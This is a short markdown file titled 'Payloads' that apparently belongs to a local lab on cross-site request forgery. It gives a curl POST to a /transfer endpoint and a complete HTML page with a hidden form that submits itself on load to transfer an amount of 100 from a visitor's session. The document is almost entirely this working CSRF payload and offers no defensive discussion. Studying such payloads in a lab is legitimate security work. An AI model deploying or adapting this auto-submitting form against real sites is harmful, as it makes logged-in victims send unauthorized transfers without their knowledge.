# Payloads

## Payload 1: HTML Form Auto Submit

curl -X POST -d "amount=100" http://localhost:8080/transfer
http://localhost:8080/balance

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <form action="http://localhost:8080/transfer" method="POST">
        <input type="hidden" name="amount" value="100">
    </form>
</body>

</html>

<script>
    document.forms[0].submit();
</script>
